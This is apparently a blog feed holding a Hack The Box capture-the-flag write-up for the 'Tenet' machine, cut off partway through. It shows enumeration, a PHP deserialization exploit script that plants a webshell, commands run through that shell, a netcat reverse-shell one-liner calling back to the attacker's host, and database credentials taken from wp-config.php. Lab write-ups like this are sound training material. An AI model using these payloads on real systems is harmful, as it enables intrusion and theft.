<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://davicruz.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://davicruz.com/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2021-06-14T16:05:05-03:00</updated><id>https://davicruz.com/feed.xml</id><title type="html">Davi Cruz</title><subtitle>Just another Cybersecurity blog</subtitle><author><name>Davi Cruz</name></author><entry><title type="html">Hackthebox write-up: Tenet</title><link href="https://davicruz.com/writeup/2021/06/htb-tenet/" rel="alternate" type="text/html" title="Hackthebox write-up: Tenet" /><published>2021-06-12T13:00:00-03:00</published><updated>2021-06-12T13:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/06/htb-tenet</id><content type="html" xml:base="https://davicruz.com/writeup/2021/06/htb-tenet/">&lt;p&gt;Hello guys!&lt;/p&gt;

&lt;p&gt;This week’s machine will be &lt;strong&gt;Tenet&lt;/strong&gt;, another medium-rated Linux box from &lt;a href=&quot;https://www.hackthebox.eu/&quot;&gt;Hack The Box&lt;/a&gt;, created by &lt;a href=&quot;https://app.hackthebox.eu/users/94858&quot;&gt;egotisticalSW&lt;/a&gt;.&lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;: Write-ups for Hack The Box machines are posted as soon as they’re retired.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ogdM1De.png&quot; alt=&quot;HTB Tenet&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before starting the resolution of this box, the image above called my attention, where I searched about TENET on the Internet and found about the Sator Square, where we have a palindrome made up of the 5 Latin words: &lt;em&gt;SATOR&lt;/em&gt;, &lt;em&gt;AREPO&lt;/em&gt;, &lt;em&gt;TENET&lt;/em&gt;, &lt;em&gt;OPERA&lt;/em&gt; e &lt;em&gt;ROTAS&lt;/em&gt;, forming a square being TENET in the center lines. Is highly probable that these words will appear during it’s resolution :smile:.&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;As usual, started with a quick &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan to identify the published services:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.223
Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-27 14:36 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.223
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.079s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;18.06 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;80tcp---http-service&quot;&gt;80/TCP - HTTP Service&lt;/h3&gt;

&lt;p&gt;Accessing this page noticed that was from the default Apache install so started right away to enumerate the directories using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; where I’ve found the &lt;strong&gt;wordpress&lt;/strong&gt; directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.223/ &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster.txt &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php,txt,html
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:            http://10.10.10.223/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:        10
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes:   200,204,301,302,307,401,403
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:     gobuster/3.0.1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions:     php,txt,html
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:        10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2021/02/27 14:44:51 Starting gobuster
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/index.html &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/users.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/wordpress &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Progress: 5055 / 220561 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.29%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;^C
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Keyboard interrupt detected, terminating.
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2021/02/27 14:48:08 Finished
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once accessed it the page was loaded without formatting and, inspecting the source code, all the assets were pointing to &lt;strong&gt;tenet.htb&lt;/strong&gt;, which was later added to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;Accessing the page again, checked that it was properly rendered now and then used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wpscan&lt;/code&gt; to enumerate version, users, and plugins, where I’ve identified this wordpress version as 5.6, no plugins and the users &lt;strong&gt;protagonist&lt;/strong&gt; and &lt;strong&gt;neil&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;As accessing the webpage again from the url &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.223/wordpress&lt;/code&gt; errors are shown, as the image below, accessed the address saw in source code (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://tenet.htb&lt;/code&gt;) full blog is displayed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/u4M23iB.png&quot; alt=&quot;HTB Tenet - 80/TCP&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the wordpress instance available at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://tenet.htb/wordpress&lt;/code&gt;, noticed some posts where one of them was mentioning an application called &lt;strong&gt;Rotas&lt;/strong&gt;, which could contain some item we could abuse to get an initial foothold in this box.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;This Is Where Our Worlds Collide
We’re looking for beta testers of our new time-management software, ‘Rotas’
‘Rotas’ will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you! For more information regarding opting-in, watch this space.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Things gets more interesting in an older post, where user &lt;strong&gt;neil&lt;/strong&gt; comments the content below:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Trying to access the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sator.php&lt;/code&gt; from the directory published under the dns name hasn’t returned anything, but I’ve succeeded using the machine IP address, getting the output below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/OOaRPfQ.png&quot; alt=&quot;HTB Tenet - sator.php&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we have a backup of this file somewhere and backups are often renamed as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;old&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bak&lt;/code&gt;, after a few attempts I have found the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sator.php.bak&lt;/code&gt; in the same directory as the previous, with the following content:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DatabaseExport&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'users.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;update_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[+] Grabbing users from text file &amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Success'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__DIR__&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[] Database updated &amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//    echo 'Gotta get this working properly...';&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'arepo'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$databaseupdate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DatabaseExport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;update_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see we could exploit it using &lt;strong&gt;PHP Deserialization&lt;/strong&gt;, once it doesn’t validate the inputs received using GET method from the query string arg  &lt;strong&gt;arepo&lt;/strong&gt;, allowing us to modify the payload to be stored in the database file.&lt;/p&gt;

&lt;h2 id=&quot;initial-access&quot;&gt;Initial access&lt;/h2&gt;

&lt;p&gt;The first step to the reverse shell was to create a serialized PHP payload to be sent in a request via &lt;strong&gt;arepo&lt;/strong&gt; arg. Searching a little about it I have found &lt;a href=&quot;https://github.com/1N3/Exploits/blob/master/PHP-Serialization-RCE-Exploit.php&quot;&gt;this exploit sample&lt;/a&gt; which was later modified to store a simple webshell in the box, later used to get a reverse shell.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; 

&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DatabaseExport&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'shell.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;?php system($_GET[&quot;cmd&quot;]); ?&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;update_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[+] Grabbing users from text file &amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Success'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__DIR__&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[] Database updated &amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//    echo 'Gotta get this working properly...';&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://10.10.10.223/sator.php?arepo='&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$arepo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;urlencode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DatabaseExport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$arepo&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After its execution, I was able to issue the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; command by using curl as we can see below.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;php exploit.php
&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; Database updated &amp;lt;br&amp;gt;[+] Grabbing &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;from text file &amp;lt;br&amp;gt;
&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; Database updated &amp;lt;br&amp;gt;[] Database updated &amp;lt;br&amp;gt;   

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://10.10.10.223/shell.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we had a confirmed RCE, make the call to obtain a reverse shell as the following example:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data-urlencode&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.136 4443 &amp;gt;/tmp/f&quot;&lt;/span&gt; http://10.10.10.223/shell.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User Flag&lt;/h2&gt;

&lt;p&gt;Accessing the box, once we already knew that at least one wordpress instance was present, searched for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-config.php&lt;/code&gt; file where I got the credentials for user &lt;strong&gt;neil&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// ** MySQL settings - You can get this info from your web host ** //&lt;/span&gt;
&lt;span class=&quot;cd&quot;&gt;/** The name of the database for WordPress */&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DB_NAME'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wordpress'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cd&quot;&gt;/** MySQL database username */&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DB_USER'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'neil'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cd&quot;&gt;/** MySQL database password */&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Opera2112'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cd&quot;&gt;/** MySQL hostname */&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DB_HOST'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
